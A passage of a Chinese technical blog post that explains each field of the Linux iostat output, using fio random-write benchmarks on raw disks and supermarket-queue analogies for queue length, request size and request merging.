id="&#x6CE8;&#x610F;&#xFF0C;&#x4E0A;&#x56FE;&#x662F;&#x5728;&#x5BF9;sdc&#x8FD9;&#x5757;&#x5355;&#x76D8;&#xFF08;RAID&#x5361;&#x4E0A;&#x7684;&#x5355;&#x76D8;&#xFF09;&#x505A;4KB&#x7684;&#x968F;&#x673A;&#x5199;&#x5165;&#x6D4B;&#x8BD5;&#xFF1A;"><a href="#&#x6CE8;&#x610F;&#xFF0C;&#x4E0A;&#x56FE;&#x662F;&#x5728;&#x5BF9;sdc&#x8FD9;&#x5757;&#x5355;&#x76D8;&#xFF08;RAID&#x5361;&#x4E0A;&#x7684;&#x5355;&#x76D8;&#xFF09;&#x505A;4KB&#x7684;&#x968F;&#x673A;&#x5199;&#x5165;&#x6D4B;&#x8BD5;&#xFF1A;" class="headerlink" title="&#x6CE8;&#x610F;&#xFF0C;&#x4E0A;&#x56FE;&#x662F;&#x5728;&#x5BF9;sdc&#x8FD9;&#x5757;&#x5355;&#x76D8;&#xFF08;RAID&#x5361;&#x4E0A;&#x7684;&#x5355;&#x76D8;&#xFF09;&#x505A;4KB&#x7684;&#x968F;&#x673A;&#x5199;&#x5165;&#x6D4B;&#x8BD5;&#xFF1A;"></a>&#x6CE8;&#x610F;&#xFF0C;&#x4E0A;&#x56FE;&#x662F;&#x5728;&#x5BF9;sdc&#x8FD9;&#x5757;&#x5355;&#x76D8;&#xFF08;RAID&#x5361;&#x4E0A;&#x7684;&#x5355;&#x76D8;&#xFF09;&#x505A;4KB&#x7684;&#x968F;&#x673A;&#x5199;&#x5165;&#x6D4B;&#x8BD5;&#xFF1A;</h6><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fio --name=randwrite --rw=randwrite --bs=4k --size=20G --runtime=1200 --ioengine=libaio --iodepth=64 --numjobs=1 --rate_iops=5000 --filename=/dev/sdf --direct=1 --group_reporting</span><br></pre></td></tr></tbody></table></figure><p>&#x56E0;&#x6B64;&#x4E0A;&#x56FE;&#x4E2D;&#x53EA;&#x6709;sdc&#x5728;&#x5FD9;&#x3002;<br>&#x5982;&#x4F55;&#x9605;&#x8BFB;iostat&#x7684;&#x8F93;&#x51FA;&#xFF0C;&#x5404;&#x4E2A;&#x53C2;&#x6570;&#x90FD;&#x662F;&#x4EC0;&#x4E48;&#x542B;&#x4E49;&#xFF0C;&#x53CD;&#x6620;&#x4E86;&#x78C1;&#x76D8;&#x7684;&#x4EC0;&#x4E48;&#x4FE1;&#x606F;&#xFF1F;<br>&#x7B2C;&#x4E00;&#x5217;Device&#x6BD4;&#x8F83;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#xFF0C;&#x5C31;&#x662F;&#x8BF4;&#x8FD9;&#x4E00;&#x884C;&#x63CF;&#x8FF0;&#x7684;&#x662F;&#x54EA;&#x4E00;&#x4E2A;&#x8BBE;&#x5907;&#x3002;</p><ul><li>rrqm/s :  &#x6BCF;&#x79D2;&#x5408;&#x5E76;&#x8BFB;&#x64CD;&#x4F5C;&#x7684;&#x6B21;&#x6570;</li><li>wrqm/s:   &#x6BCF;&#x79D2;&#x5408;&#x5E76;&#x5199;&#x64CD;&#x4F5C;&#x7684;&#x6B21;&#x6570;</li><li>r/s &#xFF1A;     &#x6BCF;&#x79D2;&#x8BFB;&#x64CD;&#x4F5C;&#x7684;&#x6B21;&#x6570;</li><li>w/s :     &#x6BCF;&#x79D2;&#x5199;&#x64CD;&#x4F5C;&#x7684;&#x6B21;&#x6570;</li><li>rMB/s :   &#x6BCF;&#x79D2;&#x8BFB;&#x53D6;&#x7684;MB&#x5B57;&#x8282;&#x6570;</li><li>wMB/s:    &#x6BCF;&#x79D2;&#x5199;&#x5165;&#x7684;MB&#x5B57;&#x8282;&#x6570;</li><li>avgrq-sz&#xFF1A;  &#x6BCF;&#x4E2A;IO&#x7684;&#x5E73;&#x5747;&#x6247;&#x533A;&#x6570;&#xFF0C;&#x5373;&#x6240;&#x6709;&#x8BF7;&#x6C42;&#x7684;&#x5E73;&#x5747;&#x5927;&#x5C0F;&#xFF0C;&#x4EE5;&#x6247;&#x533A;&#xFF08;512&#x5B57;&#x8282;&#xFF09;&#x4E3A;&#x5355;&#x4F4D;</li><li>avgqu-sz&#xFF1A;   &#x5E73;&#x5747;&#x4E3A;&#x5B8C;&#x6210;&#x7684;IO&#x8BF7;&#x6C42;&#x6570;&#x91CF;&#xFF0C;&#x5373;&#x5E73;&#x5747;&#x610F;&#x4E49;&#x5C71;&#x7684;&#x8BF7;&#x6C42;&#x961F;&#x5217;&#x957F;&#x5EA6;</li></ul><ul><li>await&#xFF1A;      &#x5E73;&#x5747;&#x6BCF;&#x4E2A;IO&#x6240;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x5305;&#x62EC;&#x5728;&#x961F;&#x5217;&#x7B49;&#x5F85;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x4E5F;&#x5305;&#x62EC;&#x78C1;&#x76D8;&#x63A7;&#x5236;&#x5668;&#x5904;&#x7406;&#x672C;&#x6B21;&#x8BF7;&#x6C42;&#x7684;&#x6709;&#x6548;&#x65F6;&#x95F4;&#x3002;<ul><li>r_wait&#xFF1A;     &#x6BCF;&#x4E2A;&#x8BFB;&#x64CD;&#x4F5C;&#x5E73;&#x5747;&#x6240;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x4E0D;&#x4EC5;&#x5305;&#x62EC;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x8BFB;&#x64CD;&#x4F5C;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x4E5F;&#x5305;&#x62EC;&#x5728;&#x5185;&#x6838;&#x961F;&#x5217;&#x4E2D;&#x7684;&#x65F6;&#x95F4;&#x3002;</li><li>w_wait:      &#x6BCF;&#x4E2A;&#x5199;&#x64CD;&#x5E73;&#x5747;&#x6240;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x4E0D;&#x4EC5;&#x5305;&#x62EC;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x5199;&#x64CD;&#x4F5C;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x4E5F;&#x5305;&#x62EC;&#x5728;&#x961F;&#x5217;&#x4E2D;&#x7B49;&#x5F85;&#x7684;&#x65F6;&#x95F4;&#x3002;</li></ul></li></ul><ul><li>svctm&#xFF1A;      &#x8868;&#x9762;&#x770B;&#x662F;&#x6BCF;&#x4E2A;IO&#x8BF7;&#x6C42;&#x7684;&#x670D;&#x52A1;&#x65F6;&#x95F4;&#xFF0C;&#x4E0D;&#x5305;&#x62EC;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#xFF0C;&#x4F46;&#x662F;&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x8FD9;&#x4E2A;&#x6307;&#x6807;&#x5DF2;&#x7ECF;&#x5E9F;&#x5F03;&#x3002;&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;iostat&#x5DE5;&#x5177;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x4E00;&#x8F93;&#x51FA;&#x9879;&#x8868;&#x793A;&#x7684;&#x662F;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x5E73;&#x5747;&#x6BCF;&#x6B21;IO&#x7684;&#x65F6;&#x95F4;&#x3002;</li><li>%util&#xFF1A;      &#x5DE5;&#x4F5C;&#x65F6;&#x95F4;&#x6216;&#x8005;&#x7E41;&#x5FD9;&#x65F6;&#x95F4;&#x5360;&#x603B;&#x65F6;&#x95F4;&#x7684;&#x767E;&#x5206;&#x6BD4;</li></ul><h4 id="avgqu-sz-&#x548C;&#x7E41;&#x5FD9;&#x7A0B;&#x5EA6;"><a href="#avgqu-sz-&#x548C;&#x7E41;&#x5FD9;&#x7A0B;&#x5EA6;" class="headerlink" title="avgqu-sz    &#x548C;&#x7E41;&#x5FD9;&#x7A0B;&#x5EA6;"></a><strong>avgqu-sz    &#x548C;&#x7E41;&#x5FD9;&#x7A0B;&#x5EA6;</strong></h4><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x7528;&#x8D85;&#x5E02;&#x8D2D;&#x7269;&#x6765;&#x6BD4;&#x5BF9;iostat&#x7684;&#x8F93;&#x51FA;&#x3002;&#x6211;&#x4EEC;&#x5728;&#x8D85;&#x5E02;&#x7ED3;&#x8D26;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E00;&#x822C;&#x4F1A;&#x6709;&#x5F88;&#x591A;&#x961F;&#x53EF;&#x4EE5;&#x6392;&#xFF0C;&#x961F;&#x5217;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x53CD;&#x5E94;&#x4E86;&#x8BE5;&#x6536;&#x94F6;&#x67DC;&#x53F0;&#x7684;&#x7E41;&#x5FD9;&#x7A0B;&#x5EA6;&#x3002;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x53D8;&#x91CF;&#x662F;avgqu-sz&#x8FD9;&#x4E2A;&#x8F93;&#x51FA;&#x53CD;&#x5E94;&#x7684;&#xFF0C;&#x8BE5;&#x503C;&#x8D8A;&#x5927;&#xFF0C;&#x8868;&#x793A;&#x6392;&#x961F;&#x7B49;&#x5F85;&#x5904;&#x7406;&#x7684;io&#x8D8A;&#x591A;&#x3002;</p><p>&#x6211;&#x4EEC;&#x641E;4K&#x7684;&#x968F;&#x673A;IO&#xFF0C;&#x4F46;&#x662F;iodepth=1 &#xFF0C;&#x67E5;&#x770B;&#x4E0B;fio&#x7684;&#x6307;&#x4EE4;&#x548C;iostat&#x7684;&#x8F93;&#x51FA;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fio --name=randwrite --rw=randwrite --bs=4k --size=20G --runtime=1200 --ioengine=libaio --iodepth=1 --numjobs=1 --filename=/dev/sdc --direct=1 --group_reporting</span><br></pre></td></tr></tbody></table></figure><p></p><img src="/2019/03/11/&#x6DF1;&#x5165;&#x7406;&#x89E3;iostat/single_disk_randw_4k_iodepth_1.png" title="single_disk_randw_4k_iodepth_1"><p>&#x540C;&#x6837;&#x662F;4K&#x7684;&#x968F;&#x673A;IO&#xFF0C;&#x6211;&#x4EEC;&#x8BBE;&#x7F6E;iodepth=16&#xFF0C; &#x67E5;&#x770B;fio&#x7684;&#x6307;&#x4EE4;&#x548C;iostat&#x7684;&#x8F93;&#x51FA;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fio --name=randwrite --rw=randwrite --bs=4k --size=20G --runtime=1200 --ioengine=libaio --iodepth=16 --numjobs=1 --filename=/dev/sdc --direct=1 --group_reporting</span><br></pre></td></tr></tbody></table></figure><p></p><img src="/2019/03/11/&#x6DF1;&#x5165;&#x7406;&#x89E3;iostat/single_disk_randw_4k_iodepth_16.png" title="single_disk_randw_4k_iodepth_16"><h6 id="&#x6CE8;&#x610F;-sdc&#x7684;avgrq-sz&#x8FD9;&#x5217;&#x7684;&#x503C;&#xFF0C;&#x53D8;&#x6210;&#x4E86;256&#xFF0C;&#x5373;256-&#x4E2A;&#x6247;&#x533A;-256-512-Byte-128KB&#xFF0C;&#x7B49;&#x4E8E;&#x6211;&#x4EEC;fio&#x6D4B;&#x8BD5;&#x65F6;&#xFF0C;&#x4E0B;&#x8FBE;&#x7684;bs-128k&#x3002;"><a href="#&#x6CE8;&#x610F;-sdc&#x7684;avgrq-sz&#x8FD9;&#x5217;&#x7684;&#x503C;&#xFF0C;&#x53D8;&#x6210;&#x4E86;256&#xFF0C;&#x5373;256-&#x4E2A;&#x6247;&#x533A;-256-512-Byte-128KB&#xFF0C;&#x7B49;&#x4E8E;&#x6211;&#x4EEC;fio&#x6D4B;&#x8BD5;&#x65F6;&#xFF0C;&#x4E0B;&#x8FBE;&#x7684;bs-128k&#x3002;" class="headerlink" title="&#x6CE8;&#x610F; sdc&#x7684;avgrq-sz&#x8FD9;&#x5217;&#x7684;&#x503C;&#xFF0C;&#x53D8;&#x6210;&#x4E86;256&#xFF0C;&#x5373;256 &#x4E2A;&#x6247;&#x533A; = 256* 512 Byte = 128KB&#xFF0C;&#x7B49;&#x4E8E;&#x6211;&#x4EEC;fio&#x6D4B;&#x8BD5;&#x65F6;&#xFF0C;&#x4E0B;&#x8FBE;&#x7684;bs = 128k&#x3002;"></a>&#x6CE8;&#x610F; sdc&#x7684;avgrq-sz&#x8FD9;&#x5217;&#x7684;&#x503C;&#xFF0C;&#x53D8;&#x6210;&#x4E86;256&#xFF0C;&#x5373;256 &#x4E2A;&#x6247;&#x533A; = 256* 512 Byte = 128KB&#xFF0C;&#x7B49;&#x4E8E;&#x6211;&#x4EEC;fio&#x6D4B;&#x8BD5;&#x65F6;&#xFF0C;&#x4E0B;&#x8FBE;&#x7684;bs = 128k&#x3002;</h6><h6 id="&#x6CE8;&#x610F;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x4E5F;&#x4E0D;&#x662F;&#x4E3A;&#x6240;&#x6B32;&#x4E3A;&#x7684;&#xFF0C;&#x5B83;&#x53D7;&#x5185;&#x6838;&#x53C2;&#x6570;&#x7684;&#x63A7;&#x5236;&#xFF1A;"><a href="#&#x6CE8;&#x610F;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x4E5F;&#x4E0D;&#x662F;&#x4E3A;&#x6240;&#x6B32;&#x4E3A;&#x7684;&#xFF0C;&#x5B83;&#x53D7;&#x5185;&#x6838;&#x53C2;&#x6570;&#x7684;&#x63A7;&#x5236;&#xFF1A;" class="headerlink" title="&#x6CE8;&#x610F;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x4E5F;&#x4E0D;&#x662F;&#x4E3A;&#x6240;&#x6B32;&#x4E3A;&#x7684;&#xFF0C;&#x5B83;&#x53D7;&#x5185;&#x6838;&#x53C2;&#x6570;&#x7684;&#x63A7;&#x5236;&#xFF1A;"></a>&#x6CE8;&#x610F;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x4E5F;&#x4E0D;&#x662F;&#x4E3A;&#x6240;&#x6B32;&#x4E3A;&#x7684;&#xFF0C;&#x5B83;&#x53D7;&#x5185;&#x6838;&#x53C2;&#x6570;&#x7684;&#x63A7;&#x5236;&#xFF1A;</h6><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@node1:~<span class="comment"># cat  /sys/block/sdc/queue/max_sectors_kb </span></span><br><span class="line">256</span><br><span class="line"><span class="comment">#&#x8FD9;&#x4E2A;&#x503C;&#x4E0D;&#x662F;&#x6700;&#x5927;&#x4E0B;&#x53D1;&#x7684;IO&#x662F;256KB&#xFF0C;&#x5373;512&#x4E2A;&#x6247;&#x533A;&#x3002;&#x5F53;&#x6211;&#x4EEC;fio&#x5BF9;sdc&#x8FD9;&#x5757;&#x76D8;&#x505A;&#x6D4B;&#x8BD5;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5982;&#x679C;bs=256k&#xFF0C;iostat&#x8F93;&#x51FA;&#x4E2D;&#x7684;avgrq-sz &#x4F1A;&#x53D8;&#x6210; 512 &#x6247;&#x533A;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x5982;&#x679C;&#x7EE7;&#x7EED;&#x589E;&#x5927;bs&#xFF0C;&#x6BD4;&#x5982;bs=512k&#xFF0C;&#x90A3;&#x4E48;iostat&#x8F93;&#x51FA;&#x4E2D;&#x7684;avgrq-sz&#x4E0D;&#x4F1A;&#x7EE7;&#x7EED;&#x589E;&#x5927;&#xFF0C;&#x4ECD;&#x7136;&#x662F;512&#xFF0C;&#x8868;&#x793A;512&#x6247;&#x533A;&#x3002;</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fio --name=randwrite --rw=randwrite --bs=512k --size=20G --runtime=1200 --ioengine=libaio --iodepth=1 --numjobs=1 --filename=/dev/sdc --direct=1 --group_reporting</span><br></pre></td></tr></tbody></table></figure><img src="/2019/03/11/&#x6DF1;&#x5165;&#x7406;&#x89E3;iostat/single_disk_randw_512k_iodepth_1.png" title="single_disk_randw_512k_iodepth_1"><h6 id="&#x6CE8;&#x610F;&#xFF0C;&#x672C;&#x6765;512KB&#x7B49;&#x4E8E;1024&#x4E2A;&#x6247;&#x533A;&#xFF0C;avgrq-sz&#x5E94;&#x8BE5;&#x4E3A;1204&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x5185;&#x6838;&#x7684;max-sectors-kb&#x63A7;&#x5236;&#x53C2;&#x6570;&#xFF0C;&#x51B3;&#x5B9A;&#x4E86;&#x4E0D;&#x53EF;&#x80FD;&#xFF1A;"><a href="#&#x6CE8;&#x610F;&#xFF0C;&#x672C;&#x6765;512KB&#x7B49;&#x4E8E;1024&#x4E2A;&#x6247;&#x533A;&#xFF0C;avgrq-sz&#x5E94;&#x8BE5;&#x4E3A;1204&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x5185;&#x6838;&#x7684;max-sectors-kb&#x63A7;&#x5236;&#x53C2;&#x6570;&#xFF0C;&#x51B3;&#x5B9A;&#x4E86;&#x4E0D;&#x53EF;&#x80FD;&#xFF1A;" class="headerlink" title="&#x6CE8;&#x610F;&#xFF0C;&#x672C;&#x6765;512KB&#x7B49;&#x4E8E;1024&#x4E2A;&#x6247;&#x533A;&#xFF0C;avgrq-sz&#x5E94;&#x8BE5;&#x4E3A;1204&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x5185;&#x6838;&#x7684;max_sectors_kb&#x63A7;&#x5236;&#x53C2;&#x6570;&#xFF0C;&#x51B3;&#x5B9A;&#x4E86;&#x4E0D;&#x53EF;&#x80FD;&#xFF1A;"></a>&#x6CE8;&#x610F;&#xFF0C;&#x672C;&#x6765;512KB&#x7B49;&#x4E8E;1024&#x4E2A;&#x6247;&#x533A;&#xFF0C;avgrq-sz&#x5E94;&#x8BE5;&#x4E3A;1204&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x5185;&#x6838;&#x7684;max_sectors_kb&#x63A7;&#x5236;&#x53C2;&#x6570;&#xFF0C;&#x51B3;&#x5B9A;&#x4E86;&#x4E0D;&#x53EF;&#x80FD;&#xFF1A;</h6><p>&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x4E5F;&#x4E0D;&#x96BE;&#x7406;&#x89E3;&#x7684;&#x73B0;&#x8C61;&#x662F;&#xFF0C;io&#x8BF7;&#x6C42;&#x8D8A;&#x5927;&#xFF0C;&#x9700;&#x8981;&#x6D88;&#x8017;&#x7684;&#x65F6;&#x95F4;&#x5C31;&#x4F1A;&#x8D8A;&#x957F;&#x3002;&#x5BF9;&#x4E8E;&#x5757;&#x8BBE;&#x5907;&#x800C;&#x8A00;&#xFF0C;&#x65F6;&#x95F4;&#x5206;&#x6210;2&#x4E2A;&#x90E8;&#x5206;&#xFF1A;</p><ul><li>&#x5BFB;&#x9053;</li><li>&#x8BFB;&#x6216;&#x5199;&#x64CD;&#x4F5C;<br>&#x6CE8;&#x610F;&#x6B64;&#x5904;&#x7684;&#x5BFB;&#x9053;&#x4E0D;&#x80FD;&#x7B80;&#x5355;&#x5730;&#x7406;&#x89E3;&#x6210;&#x78C1;&#x76D8;&#x78C1;&#x5934;&#x65CB;&#x8F6C;&#x5230;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#xFF0C;&#x56E0;&#x4E3A;&#x540E;&#x5907;&#x5757;&#x8BBE;&#x5907;&#x53EF;&#x80FD;&#x662F;RAID&#xFF0C;&#x53EF;&#x80FD;&#x662F;SSD&#xFF0C;&#x6211;&#x4EEC;&#x7406;&#x89E3;&#x5199;&#x5165;&#x524D;&#x7684;&#x51C6;&#x5907;&#x52A8;&#x4F5C;&#x3002;&#x51C6;&#x5907;&#x5DE5;&#x4F5C;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#xFF0C;&#x5199;&#x5165;4K&#x548C;&#x5199;&#x5165;128KB&#xFF0C;&#x660E;&#x663E;&#x5199;&#x5165;128KB&#x7684;&#x5DE5;&#x4F5C;&#x91CF;&#x8981;&#x66F4;&#x5927;&#x4E00;&#x4E9B;&#xFF0C;&#x56E0;&#x6B64;&#x5F88;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#x968F;&#x673A;&#x5199;&#x5165;128KB&#x7ED9;&#x5757;&#x8BBE;&#x5907;&#x5E26;&#x6765;&#x7684;&#x8D1F;&#x8F7D;&#x8981;&#x6BD4;&#x968F;&#x673A;&#x5199;&#x5165;4K&#x7ED9;&#x5757;&#x8BBE;&#x5907;&#x5E26;&#x6765;&#x7684;&#x8D1F;&#x8F7D;&#x8981;&#x9AD8;&#x4E00;&#x4E9B;&#x3002;</li></ul><p>&#x5BF9;&#x6BD4;&#x751F;&#x6D3B;&#x4E2D;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;&#x8D85;&#x65F6;&#x6392;&#x961F;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F60;&#x4F1A;&#x9996;&#x5148;&#x67E5;&#x770B;&#x961F;&#x5217;&#x7684;&#x957F;&#x5EA6;&#x6765;&#x8BC4;&#x4F30;&#x4E0B;&#x65F6;&#x95F4;&#xFF0C;&#x5982;&#x679C;&#x961F;&#x5217;&#x90FD;&#x5DEE;&#x4E0D;&#x591A;&#x957F;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4F60;&#x5C31;&#x8981;&#x5173;&#x5FC3;&#x524D;&#x9762;&#x987E;&#x5BA2;&#x7BEE;&#x5B50;&#x91CC;&#x4E1C;&#x897F;&#x7684;&#x591A;&#x5C11;&#x4E86;&#x3002;&#x5982;&#x679C;&#x524D;&#x9762;&#x987E;&#x5BA2;&#x6BCF;&#x4EBA;&#x624B;&#x91CC;&#x62FF;&#x7740;&#x4E00;&#x4E24;&#x4EF6;&#x5546;&#x54C1;&#xFF0C;&#x53E6;&#x4E00;&#x961F;&#x51E0;&#x4E4E;&#x6BCF;&#x4E00;&#x4E2A;&#x4EBA;&#x90FD;&#x63A8;&#x8FD9;&#x6EE1;&#x6EE1;&#x4E00;&#x8F66;&#x5B50;&#x7684;&#x5546;&#x54C1;&#xFF0C;&#x4F60;&#x53EF;&#x80FD;&#x77E5;&#x9053;&#x8981;&#x6392;&#x90A3;&#x4E00;&#x961F;&#x3002;&#x56E0;&#x4E3A;&#x5546;&#x54C1;&#x8D8A;&#x591A;&#xFF0C;&#x5904;&#x7406;&#x5355;&#x4E2A;&#x987E;&#x5BA2;&#x7684;&#x65F6;&#x95F4;&#x5C31;&#x4F1A;&#x8D8A;&#x4E45;&#x3002;IO&#x4E5F;&#x662F;&#x5982;&#x6B64;&#x3002;</p><h4 id="rrqm-s-&#x548C;wrqm-s"><a href="#rrqm-s-&#x548C;wrqm-s" class="headerlink" title="rrqm/s &#x548C;wrqm/s"></a>rrqm/s &#x548C;wrqm/s</h4><p>&#x5757;&#x8BBE;&#x5907;&#x6709;&#x76F8;&#x5E94;&#x7684;&#x8C03;&#x5EA6;&#x7B97;&#x6CD5;&#x3002;&#x5982;&#x679C;&#x4E24;&#x4E2A;IO&#x53D1;&#x751F;&#x5728;&#x76F8;&#x90BB;&#x7684;&#x6570;&#x636E;&#x5757;&#x65F6;&#xFF0C;&#x4ED6;&#x4EEC;&#x53EF;&#x4EE5;&#x5408;&#x5E76;&#x6210;1&#x4E2A;IO&#x3002;</p><p>&#x8FD9;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;&#x5FEB;&#x9012;&#x5458;&#x8981;&#x7ED9;&#x4E00;&#x4E2A;18&#x5C42;&#x7684;&#x516C;&#x53F8;&#x6240;&#x6709;&#x5458;&#x5DE5;&#x9001;&#x5FEB;&#x9012;&#xFF0C;&#x6BCF;&#x4E00;&#x5C42;&#x90FD;&#x6709;&#x4E00;&#x4E9B;&#x5305;&#x88F9;&#xFF0C;&#x5BF9;&#x4E8E;&#x5FEB;&#x9012;&#x5458;&#x6765;&#x8BF4;&#xFF0C;&#x6700;&#x597D;&#x7684;&#x529E;&#x6CD5;&#x662F;&#x540C;&#x4E00;&#x697C;&#x5C42;&#x76F8;&#x8FD1;&#x7684;&#x4F4D;&#x7F6E;&#x7684;&#x5305;&#x88F9;&#x4E00;&#x8D77;&#x6295;&#x9012;&#xFF0C;&#x5426;&#x5219;&#x5982;&#x679C;&#x4E0D;&#x91C7;&#x7528;&#x8FD9;&#x79CD;&#x7B97;&#x6CD5;&#xFF0C;&#x91C7;&#x7528;&#x6700;&#x539F;&#x59CB;&#x7684;&#x6765;&#x4E00;&#x4E2A;&#x9001;&#x4E00;&#x4E2A;&#xFF08;&#x5373;noop&#x7B97;&#x6CD5;&#xFF09;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x5FEB;&#x9012;&#x5458;&#xFF0C;&#x53EF;&#x80FD;&#x5148;&#x9001;&#x4E86;&#x4E00;&#x4E2A;&#x5305;&#x62EC;&#x5230;18&#x5C42;&#xFF0C;&#x53C8;&#x4E0D;&#x5F97;&#x4E0D;&#x8DD1;&#x5230;2&#x5C42;&#x9001;&#x53E6;&#x4E00;&#x4E2A;&#x5305;&#x88F9;&#xFF0C;&#x7136;&#x540E;&#x6709;&#x4E0D;&#x5F97;&#x4E0D;&#x8DD1;&#x5230;16&#x5C42;&#x9001;&#x7B2C;&#x4E09;&#x4E2A;&#x5305;&#x88F9;&#xFF0C;&#x7136;&#x540E;&#x5305;&#x5230;1&#x5C42;&#x9001;&#x7B2C;&#x4E09;&#x4E2A;&#x5305;&#x88F9;&#xFF0C;&#x90A3;&#x4E48;&#x5FEB;&#x9012;&#x5458;&#x7684;&#x8F68;&#x8FF9;&#x662F;&#x6742;&#x4E71;&#x65E0;&#x7AE0;&#x7684;&#xFF0C;&#x4E5F;&#x662F;&#x975E;&#x5E38;&#x4F4E;&#x6548;&#x7684;&#x3002;</p><p>Linux&#x5E38;&#x89C1;&#x7684;&#x8C03;&#x5EA6;&#x7B97;&#x6CD5;&#x6709;:</p><ul><li>noop</li><li>deadline</li><li>cfq</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@node:~<span class="comment"># cat /sys/block/sdc/queue/scheduler </span></span><br><span class="line">[noop] deadline cfq</span><br></pre></td></tr></tbody></table></figure><h4 id="&#x7C7B;&#x6BD4;&#x603B;&#x7ED3;"><a href="#&#x7C7B;&#x6BD4;&#x603B;&#x7ED3;" class="headerlink" title="&#x7C7B;&#x6BD4;&#x603B;&#x7ED3;"></a>&#x7C7B;&#x6BD4;&#x603B;&#x7ED3;</h4><p>&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x4EE5;&#x8D85;&#x65F6;&#x8D2D;&#x7269;&#x4E3A;&#x4F8B;&#xFF0C;&#x6BD4;&#x5982;&#x4E00;&#x5BB6;&#x4E09;&#x53E3;&#x53BB;&#x8D2D;&#x7269;&#xFF0C;&#x5404;&#x4EBA;&#x4E70;&#x5404;&#x4EBA;&#x7684;&#x4E1C;&#x897F;&#xFF0C;&#x6700;&#x7EC8;&#x4F1A;&#x6C47;&#x603B;&#x5230;&#x6536;&#x94F6;&#x53F0;&#xFF0C;&#x4F60;&#x56FA;&#x7136;&#x53EF;&#x4EE5;&#x6BCF;&#x4EBA;&#x5404;&#x81EA;&#x4ED8;&#x5404;&#x81EA;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x53EF;&#x4EE5;&#x6C47;&#x603B;&#x4E00;&#x4E0B;&#xFF0C;&#x628A;&#x6240;&#x6709;&#x8D2D;&#x4E70;&#x7684;&#x4E1C;&#x897F;&#x653E;&#x5728;&#x4E00;&#x8D77;&#xFF0C;&#x7531;&#x4E00;&#x4E2A;&#x4EBA;&#x6765;&#x5B8C;&#x6210;&#xFF0C;&#x4E5F;&#x5C31;&#x8BF4;&#xFF0C;&#x4E09;&#x6B21;&#x6536;&#x94F6;&#x4E8B;&#x4EF6;merge&#x6210;&#x4E86;&#x4E00;&#x6B21;&#x3002;</p><p>&#x81F3;&#x6B64;&#xFF0C;&#x6211;&#x4EEC;&#x4EE5;&#x8D85;&#x65F6;&#x8D2D;&#x7269;&#x6536;&#x94F6;&#x4E3A;&#x4F8B;&#xFF0C;&#x4ECB;&#x7ECD;&#x4E86;avgqu-sz &#x7C7B;&#x6BD4;&#x4E8E;&#x961F;&#x4F0D;&#x7684;&#x957F;&#x5EA6;&#xFF0C;avgrq-sz &#x7C7B;&#x6BD4;&#x4E8E;&#x6BCF;&#x4E2A;&#x4EBA;&#x8D2D;&#x7269;&#x8F66;&#x91CC;&#x7269;&#x54C1;&#x7684;&#x591A;&#x5C11;&#xFF0C;rrqm/s&#x548C;wrqm/s 